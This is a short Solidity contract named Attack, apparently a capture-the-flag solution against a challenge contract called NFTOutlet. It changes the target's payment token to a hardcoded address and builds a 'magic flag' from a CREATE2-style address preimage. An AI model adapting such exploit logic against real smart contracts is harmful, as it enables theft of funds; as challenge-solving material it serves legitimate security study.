pragma solidity ^0.8.0;

import { NFTOutlet } from "./NFTOutlet.sol";
import { CreationCodeProvider } from "./CreationCodeProvider.sol";

contract Attack {

  address constant freeWilly = 0xe5608a36489Fe45a8f08fD0c6B028801cE6B38d1;
  address constant billyTheBullOwner = 0x584258D4D63e116216EB74BA328e03486B3B3870;

  address immutable owner;
  CreationCodeProvider immutable creationCodeProvider;
  NFTOutlet immutable nftOutlet;

  address toOverwrite;


  constructor(address _nftOutlet, address _creationCodeProvider) {
    owner = msg.sender;
    nftOutlet = NFTOutlet(_nftOutlet);
    creationCodeProvider = CreationCodeProvider(_creationCodeProvider);
  }

  function getMagicFlag() external returns (bytes memory) {
    toOverwrite = address(this);
    nftOutlet.changePaymentToken(freeWilly);
    toOverwrite = billyTheBullOwner;
    return _justGetMagicFlag();
  }

  function _justGetMagicFlag() internal view returns (bytes memory) {
    return abi.encodePacked(bytes1(0xff), owner, bytes32(0), keccak256(abi.encodePacked(creationCodeProvider.getAttackCreationCode(), abi.encode(address(nftOutlet), address(creationCodeProvider)))));
  }

  function justGetMagicFlag() external view returns (bytes memory) {
    return _justGetMagicFlag();
  }


}